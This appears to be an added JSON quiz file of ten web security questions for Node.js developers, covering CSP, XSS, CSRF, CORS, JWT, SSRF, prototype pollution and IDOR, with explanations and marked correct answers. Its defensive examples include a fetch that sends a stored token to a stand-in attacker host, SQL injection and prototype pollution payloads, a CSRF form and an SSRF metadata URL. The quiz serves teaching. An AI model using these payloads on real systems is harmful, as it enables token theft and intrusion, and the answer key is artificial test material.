@@ -1,0 +1,226 @@
+{
+  "id": "security",
+  "name": "Security",
+  "questions": [
+    {
+      "question": "Your Node.js API sets the following HTTP response header. An attacker injects `<script>alert(document.cookie)</script>` into server-rendered HTML. Which directive blocks execution, and why does adding `'unsafe-inline'` to `script-src` completely defeat the policy?\n\n```\nContent-Security-Policy: default-src 'self'; script-src 'self'\n```",
+      "explanation": "**`script-src 'self'`** is the operative directive. It tells the browser to only execute scripts that originate from the same origin as the document — this blocks inline `<script>` tags and inline event handlers (`onclick=\"...\"`) entirely, which are the primary XSS delivery mechanisms.\n\nAdding **`'unsafe-inline'`** to `script-src` re-enables all inline script execution. Since XSS attacks inject inline code, allowing `'unsafe-inline'` makes the entire CSP useless against XSS.\n\nThe modern alternative is a **nonce-based CSP**: the server generates a cryptographically random nonce per request, includes `'nonce-<value>'` in `script-src`, and adds `nonce=\"<value>\"` to every legitimate `<script>` tag. Injected scripts won't carry the correct nonce and are blocked. A **hash-based** approach (`'sha256-<hash>'`) works similarly for static inline scripts. Both strategies allow specific inline scripts without enabling arbitrary inline execution.",
+      "answers": [
+        {
+          "answer": "`script-src 'self'` blocks the injected inline script. Adding `'unsafe-inline'` re-enables all inline scripts and completely undermines the XSS protection.",
+          "isCorrect": true
+        },
+        {
+          "answer": "`default-src 'self'` blocks the script; `script-src` only applies to external script files, not inline tags.",
+          "isCorrect": false
+        },
+        {
+          "answer": "Neither directive blocks inline scripts by default — you must explicitly add `script-src 'none'`.",
+          "isCorrect": false
+        },
+        {
+          "answer": "`script-src 'self'` blocks the script, and `'unsafe-inline'` is only dangerous for cross-origin scripts, not same-origin injections.",
+          "isCorrect": false
+        }
+      ]
+    },
+    {
+      "question": "An attacker successfully injects the following XSS payload into your web application. The app stores its JWT in `localStorage`.\n\n```javascript\nfetch('https://attacker.com/steal?t=' + localStorage.getItem('auth_token'));\n```\n\nWhat is exfiltrated, and what storage mechanism prevents this entire class of attack?",
+      "explanation": "The complete JWT is exfiltrated to the attacker's server. With a valid JWT the attacker can impersonate the user for the token's entire lifetime — there is typically no server-side session state to invalidate. This is the fundamental risk of storing authentication tokens in `localStorage` (or `sessionStorage`): **any JavaScript running on the page has full read access to it**, including injected scripts.\n\n**HttpOnly cookies** prevent this attack. A cookie with the `HttpOnly` flag set is inaccessible to JavaScript — `document.cookie` does not include it, and `localStorage` / `sessionStorage` APIs are unrelated. The browser automatically attaches the cookie to same-origin requests, but no script (including injected XSS payloads) can read or exfiltrate it.\n\nThe complete secure cookie configuration for a JWT:\n```\nSet-Cookie: auth_token=<jwt>; HttpOnly; Secure; SameSite=Strict; Path=/\n```\n- `HttpOnly`: no JS access\n- `Secure`: HTTPS only\n- `SameSite=Strict`: CSRF protection — cookie is not sent on cross-origin requests\n\nThe trade-off: HttpOnly cookies require the same origin for API calls (or careful CORS configuration). SPAs talking to a separate API domain often need a `SameSite=None; Secure` cookie with a strict CORS allowlist — still far safer than `localStorage`.",
+      "answers": [
+        {
+          "answer": "The full JWT is stolen and can be used to impersonate the user. `HttpOnly` cookies prevent this — JavaScript cannot read `HttpOnly` cookies, so the XSS payload cannot exfiltrate the token.",
+          "isCorrect": true
+        },
+        {
+          "answer": "Only the JWT header and payload are readable; the signature is never stored in `localStorage`, so the attacker cannot forge requests.",
+          "isCorrect": false
+        },
+        {
+          "answer": "The `fetch` request is blocked by the browser's Same-Origin Policy (SOP) because the destination domain differs from the app's origin.",
+          "isCorrect": false
+        },
+        {
+          "answer": "Nothing is exfiltrated — `localStorage` is sandboxed per tab and cannot be accessed by dynamically injected scripts.",
+          "isCorrect": false
+        }
+      ]
+    },
+    {
+      "question": "A Node.js API stores user passwords by hashing them with SHA-256 before saving to the database. A security reviewer flags this as insecure even though SHA-256 is cryptographically strong. Why is SHA-256 the wrong tool for password storage, and what should be used instead?",
+      "explanation": "SHA-256 is a **fast, general-purpose cryptographic hash** — and *fast* is exactly the problem for password storage. Two weaknesses make raw SHA-256 unsuitable:\n\n1. **Speed enables brute force.** Modern GPUs and ASICs compute *billions* of SHA-256 hashes per second. If a database leaks, an attacker can try enormous numbers of candidate passwords per second against each hash. Fast hashing is a feature for integrity/signatures but a liability for passwords.\n\n2. **No built-in salt → rainbow tables and shared hashes.** Without a per-user salt, identical passwords produce identical hashes, so an attacker sees which users share a password and can use precomputed **rainbow tables** to reverse common passwords instantly.\n\nThe correct tool is a **slow, salted, adaptive password-hashing function** designed specifically for this purpose:\n- **bcrypt** — battle-tested, includes a per-hash salt automatically, with a tunable **work factor** (cost) you raise as hardware improves.\n- **scrypt** and **Argon2** (Argon2id is the current recommendation, PHC winner) — additionally **memory-hard**, defeating GPU/ASIC parallelism by requiring large amounts of RAM per guess.\n\nExample with bcrypt:\n```javascript\nimport bcrypt from \"bcrypt\";\nconst hash = await bcrypt.hash(password, 12); // cost factor 12\nconst ok   = await bcrypt.compare(password, hash);\n```\n\nThe deliberate slowness (tens of milliseconds per hash) is negligible for a single legitimate login but makes large-scale offline cracking economically infeasible. The salt is generated and stored inside the bcrypt output automatically, so identical passwords yield different hashes.",
+      "answers": [
+        {
+          "answer": "SHA-256 is designed to be fast and is unsalted, so a leaked database can be brute-forced at billions of guesses per second and is vulnerable to rainbow tables. Use a slow, salted, adaptive hash like bcrypt, scrypt, or Argon2id instead.",
+          "isCorrect": true
+        },
+        {
+          "answer": "SHA-256 is reversible if you know the input length, so attackers can decrypt the passwords directly. Use AES-256 encryption for passwords instead.",
+          "isCorrect": false
+        },
+        {
+          "answer": "SHA-256 produces only 256 bits of output, which is too short to be secure for passwords. Use SHA-512 to double the hash length and fix the vulnerability.",
+          "isCorrect": false
+        },
+        {
+          "answer": "SHA-256 is fine as long as you hash the password twice (SHA-256 of the SHA-256); double hashing adds the needed slowness and salting automatically.",
+          "isCorrect": false
+        }
+      ]
+    },
+    {
+      "question": "What's the vulnerability in this Express endpoint, and what's the correct fix?\n\n```typescript\napp.get(\"/users\", async (req, res) => {\n  const { rows } = await pool.query(\n    `SELECT id, email FROM users WHERE name = '${req.query.name}'`\n  );\n  res.json(rows);\n});\n```",
+      "explanation": "User input is interpolated directly into the SQL string, which is a classic **SQL injection**. A request like `/users?name=' OR '1'='1` produces:\n\n```sql\nSELECT id, email FROM users WHERE name = '' OR '1'='1'\n```\n\nThat returns every user. More dangerous payloads can use `UNION SELECT` to read other tables or, depending on driver settings, stack additional statements.\n\nThe fix is **parameterized queries** (prepared statements). The SQL text and the values are sent to the database **separately**, so input is always treated as data and never parsed as SQL:\n\n```typescript\nconst { rows } = await pool.query(\n  \"SELECT id, email FROM users WHERE name = $1\",\n  [req.query.name]\n);\n```\n\nQuery builders and ORMs (Knex, Prisma, Drizzle) parameterize for you, as long as you don't use their \"raw\" escape hatches with string interpolation.\n\nHand-rolled escaping (like replacing `'`) is fragile and easy to bypass via encodings and edge cases. Client-side validation can be skipped entirely by calling the API directly. Changing GET to POST doesn't change how the string is built.",
+      "answers": [
+        {
+          "answer": "SQL injection. Input is concatenated into the query string. Use a parameterized query (`WHERE name = $1` with `[req.query.name]`) so the value is never parsed as SQL.",
+          "isCorrect": true
+        },
+        {
+          "answer": "SQL injection. Fix it by escaping single quotes with `name.replace(/'/g, \"''\")` before interpolating.",
+          "isCorrect": false
+        },
+        {
+          "answer": "Cross-site scripting. Fix it by HTML-encoding `rows` before calling `res.json`.",
+          "isCorrect": false
+        },
+        {
+          "answer": "Sensitive data in the URL. Change the endpoint to POST so the name is sent in the body, which prevents tampering.",
+          "isCorrect": false
+        }
+      ]
+    },
+    {
+      "question": "Your app authenticates users with a session cookie. An attacker hosts a page that silently auto-submits this form when a logged-in user visits it:\n\n```html\n<form action=\"https://bank.example.com/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"to\" value=\"attacker\" />\n  <input type=\"hidden\" name=\"amount\" value=\"5000\" />\n</form>\n<script>document.forms[0].submit()</script>\n```\n\nWhich defense actually prevents this attack?",
+      "explanation": "This is **Cross-Site Request Forgery (CSRF)**. The browser automatically attaches cookies to requests to `bank.example.com`, even when another site initiates the request. The server sees a valid session and performs the transfer.\n\nEffective defenses:\n- **`SameSite` cookies.** `SameSite=Lax` (the default in modern browsers if unspecified) prevents the cookie being sent on cross-site POSTs. `SameSite=Strict` also blocks it on top-level cross-site navigations.\n- **Anti-CSRF tokens.** Use a per-session or per-request secret, either embedded in forms (synchronizer token) or sent via a double-submit cookie and header. A cross-site page can't read the token, so it can't include it.\n- **Checking `Origin`/`Sec-Fetch-Site` headers** on state-changing requests.\n\nUse them together for defense in depth.\n\nWhy the others fail:\n- **`HttpOnly`** stops JavaScript from *reading* the cookie (an XSS mitigation), but the browser still *sends* it.\n- **CORS** controls whether a cross-origin script can *read the response*. A plain HTML form POST is a \"simple request\": it isn't preflighted and is sent regardless.\n- **HTTPS** protects data in transit and does nothing against forged requests.",
+      "answers": [
+        {
+          "answer": "Set the session cookie to `SameSite=Lax` or `Strict` and require an anti-CSRF token (or verify the `Origin` header) on state-changing requests.",
+          "isCorrect": true
+        },
+        {
+          "answer": "Mark the session cookie `HttpOnly` so the attacker's page can't use it.",
+          "isCorrect": false
+        },
+        {
+          "answer": "Configure a strict CORS policy that only allows `https://bank.example.com`, so the browser blocks the cross-origin POST.",
+          "isCorrect": false
+        },
+        {
+          "answer": "Serve the site only over HTTPS with HSTS, so requests from other origins are rejected.",
+          "isCorrect": false
+        }
+      ]
+    },
+    {
+      "question": "A developer adds this middleware to \"fix CORS errors\" for a cookie-authenticated API. What's the security impact?\n\n```typescript\napp.use((req, res, next) => {\n  res.setHeader(\"Access-Control-Allow-Origin\", req.headers.origin ?? \"*\");\n  res.setHeader(\"Access-Control-Allow-Credentials\", \"true\");\n  next();\n});\n```",
+      "explanation": "Browsers won't allow `Access-Control-Allow-Origin: *` together with credentials, so developers sometimes **reflect** the request's `Origin` header instead. That effectively allows *every* origin, with credentials.\n\nThe result: if a logged-in user visits `https://evil.example`, a script on that page can run:\n\n```javascript\nfetch(\"https://api.yourapp.com/me\", { credentials: \"include\" })\n  .then((r) => r.json())\n  .then(exfiltrate);\n```\n\nThe browser attaches the user's cookies, and because the response says `evil.example` is allowed with credentials, it **lets the attacker's script read the response**. That exposes private data, and any CSRF tokens the API returns.\n\nRemember: CORS doesn't protect your server from requests. It's a browser mechanism that decides which origins may **read** responses. Loosening it widens who can read authenticated data.\n\nFix: validate `Origin` against an **explicit allowlist** of trusted origins, set `Vary: Origin`, and only send `Allow-Credentials: true` for those origins.",
+      "answers": [
+        {
+          "answer": "Any website can make credentialed requests on behalf of a logged-in user and read the responses, because the server reflects every origin with credentials allowed. Use an explicit origin allowlist instead.",
+          "isCorrect": true
+        },
+        {
+          "answer": "None. Browsers ignore `Access-Control-Allow-Origin` when it's set dynamically from the request, so this behaves like `*`.",
+          "isCorrect": false
+        },
+        {
+          "answer": "It only affects unauthenticated endpoints. Browsers never send cookies on cross-origin `fetch` calls, even with `credentials: \"include\"`.",
+          "isCorrect": false
+        },
+        {
+          "answer": "It enables SQL injection, because the `Origin` header is copied into a response header without sanitization.",
+          "isCorrect": false
+        }
+      ]
+    },
+    {
+      "question": "An authorization middleware reads a JWT from the `Authorization` header like this. What's the most serious flaw?\n\n```typescript\nimport jwt from \"jsonwebtoken\";\n\nfunction requireAdmin(req, res, next) {\n  const token = req.headers.authorization?.replace(\"Bearer \", \"\");\n  const payload = jwt.decode(token) as { sub: string; role: string };\n  if (payload?.role !== \"admin\") return res.sendStatus(403);\n  req.userId = payload.sub;\n  next();\n}\n```",
+      "explanation": "`jwt.decode` only **base64url-decodes** the token's payload. It **doesn't verify the signature**. A JWT's header and payload are readable and editable by anyone, so an attacker can craft a token with `{\"role\":\"admin\"}`, give it any (or no) signature, and the middleware trusts it.\n\nAlways use **`jwt.verify`** with the correct key, and **pin the accepted algorithms**:\n\n```typescript\nconst payload = jwt.verify(token, publicKey, {\n  algorithms: [\"RS256\"],\n  issuer: \"https://auth.example.com\",\n  audience: \"my-api\",\n});\n```\n\nPinning algorithms prevents attacks where the token's own `alg` header picks the verification method. Examples include `alg: \"none\"`, or **algorithm confusion**: switching RS256 to HS256 so the server's *public* key is used as an HMAC secret. Also validate `exp`, `iss`, and `aud`. `verify` checks `exp` by default.\n\nJWTs aren't encrypted by default, so they also shouldn't contain secrets. That's a separate issue from this flaw.",
+      "answers": [
+        {
+          "answer": "`jwt.decode` doesn't verify the signature, so anyone can forge a token with `role: \"admin\"`. Use `jwt.verify` with the right key and a pinned `algorithms` list (and check `iss`/`aud`).",
+          "isCorrect": true
+        },
+        {
+          "answer": "The token should be read from a cookie instead of the `Authorization` header. Bearer tokens can be forged in transit.",
+          "isCorrect": false
+        },
+        {
+          "answer": "`jwt.decode` throws on expired tokens, so the middleware crashes for logged-out users. Wrap it in `try/catch`.",
+          "isCorrect": false
+        },
+        {
+          "answer": "The main flaw is that JWT payloads are encrypted, so the role should be fetched from the database instead.",
+          "isCorrect": false
+        }
+      ]
+    },
+    {
+      "question": "Your Node.js service, running on AWS EC2, has an \"import from URL\" feature: it fetches whatever URL the user provides and stores the response. An attacker submits `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. What's this attack, and what's the most effective mitigation?",
+      "explanation": "This is **Server-Side Request Forgery (SSRF)**. The attacker makes *your server* send requests to destinations they can't reach directly: internal services, admin panels, or here, the **cloud instance metadata endpoint**, which can return temporary IAM credentials for the instance's role. This was the core of the 2019 Capital One breach.\n\nEffective mitigations, layered:\n- **Allowlist** destination hosts or schemes where possible (only `https`, only known domains).\n- If arbitrary URLs are required, **resolve DNS yourself and reject private, loopback, and link-local ranges** (`10/8`, `172.16/12`, `192.168/16`, `127/8`, `169.254/16`, `::1`, `fc00::/7`, etc.). **Connect to the resolved IP** you checked, so DNS rebinding can't swap it after validation, and **re-validate on every redirect** (or disable redirects).\n- **Network egress controls**: run the fetcher in an isolated subnet or proxy that can't reach internal ranges.\n- On AWS, **require IMDSv2**, which needs a session token obtained with a PUT request that simple SSRF can't usually perform.\n\nString-matching the URL (e.g. blocking `\"169.254\"`) is easy to bypass with decimal IPs (`http://2852039166/`), alternate encodings, or DNS names that resolve to internal addresses.",
+      "answers": [
+        {
+          "answer": "Server-Side Request Forgery (SSRF). Allowlist destinations, or resolve the hostname and block private and link-local IPs (re-checking on redirects), add egress controls, and enforce IMDSv2.",
+          "isCorrect": true
+        },
+        {
+          "answer": "Cross-site request forgery. Add a CSRF token to the import form.",
+          "isCorrect": false
+        },
+        {
+          "answer": "Open redirect. Validate that the URL's path doesn't contain `..` segments.",
+          "isCorrect": false
+        },
+        {
+          "answer": "SSRF. Block any URL string that contains `169.254`, since that fully covers metadata access.",
+          "isCorrect": false
+        }
+      ]
+    },
+    {
+      "question": "An API merges JSON request bodies into a settings object using this helper. An attacker sends `{\"__proto__\": {\"isAdmin\": true}}`. What happens?\n\n```javascript\nfunction merge(target, source) {\n  for (const key in source) {\n    if (typeof source[key] === \"object\" && source[key] !== null) {\n      target[key] = merge(target[key] ?? {}, source[key]);\n    } else {\n      target[key] = source[key];\n    }\n  }\n  return target;\n}\n\nmerge({}, JSON.parse(req.body));\n```",
+      "explanation": "This is **prototype pollution**. `JSON.parse` creates an **own property** literally named `\"__proto__\"`, and `for...in` enumerates it. Inside `merge`:\n\n- `target[\"__proto__\"]` on a normal object doesn't return an own property. It goes through the `__proto__` accessor and returns **`Object.prototype`**.\n- `merge(Object.prototype, { isAdmin: true })` then sets `Object.prototype.isAdmin = true`.\n\nNow **every object in the process** inherits `isAdmin === true`. Code like `if (user.isAdmin)` passes for any user object without its own `isAdmin` property. Depending on the gadgets available, prototype pollution can escalate to auth bypass, denial of service, or even RCE (e.g. via polluted options passed to `child_process`).\n\nMitigations:\n- Skip dangerous keys (`__proto__`, `constructor`, `prototype`) in merge or clone utilities, or check `Object.hasOwn` on the target.\n- Use `Object.create(null)` objects or `Map` for user-keyed data.\n- Validate input against a strict schema (Zod, Ajv with `additionalProperties: false`).\n- Consider `node --disable-proto=delete`, or freezing `Object.prototype`.",
+      "answers": [
+        {
+          "answer": "Prototype pollution. `target[\"__proto__\"]` resolves to `Object.prototype`, so `isAdmin: true` is written onto it and every object in the process now inherits `isAdmin === true`.",
+          "isCorrect": true
+        },
+        {
+          "answer": "Nothing. `JSON.parse` strips `__proto__` keys, so the payload becomes an empty object.",
+          "isCorrect": false
+        },
+        {
+          "answer": "Only the merged settings object gets `isAdmin: true` as an own property, which is harmless if it's never checked.",
+          "isCorrect": false
+        },
+        {
+          "answer": "The merge throws a `TypeError` because `Object.prototype` is frozen by default in Node.js.",
+          "isCorrect": false
+        }
+      ]
+    },
+    {
+      "question": "What's the vulnerability in this authenticated endpoint?\n\n```typescript\napp.get(\"/api/invoices/:id\", requireAuth, async (req, res) => {\n  const invoice = await db.invoice.findUnique({\n    where: { id: req.params.id },\n  });\n  if (!invoice) return res.sendStatus(404);\n  res.json(invoice);\n});\n```",
+      "explanation": "This is **Broken Object Level Authorization (BOLA)**, also called **Insecure Direct Object Reference (IDOR)**. It's #1 on the OWASP API Security Top 10.\n\n`requireAuth` only establishes *who* the caller is (**authentication**). Nothing checks whether that user is *allowed to access this particular invoice* (**authorization**). Any logged-in user can read anyone's invoice by changing the `id` in the URL.\n\nFix: scope every data access to the caller's permissions, ideally inside the query itself:\n\n```typescript\nconst invoice = await db.invoice.findFirst({\n  where: { id: req.params.id, customerId: req.user.customerId },\n});\nif (!invoice) return res.sendStatus(404); // 404 avoids revealing existence\n```\n\nIn multi-tenant systems, enforce tenant scoping centrally (repository layer, Postgres row-level security) so a single forgotten check doesn't leak data.\n\nUnguessable IDs (UUIDs) reduce enumeration but aren't an access control: IDs leak through URLs, logs, and shared links. Rate limiting only slows down exploitation.",
+      "answers": [
+        {
+          "answer": "Broken object-level authorization (IDOR). Any authenticated user can fetch any invoice by ID. Scope the query to the caller (e.g. `where: { id, customerId: req.user.customerId }`).",
+          "isCorrect": true
+        },
+        {
+          "answer": "There's no vulnerability. `requireAuth` ensures only legitimate users reach the handler.",
+          "isCorrect": false
+        },
+        {
+          "answer": "Sequential IDs are enumerable. Switching invoice IDs to UUIDs fully fixes the issue.",
+          "isCorrect": false
+        },
+        {
+          "answer": "The 404 response leaks information. Return 200 with an empty body instead.",
+          "isCorrect": false
+        }
+      ]
+    }
+  ]
+}
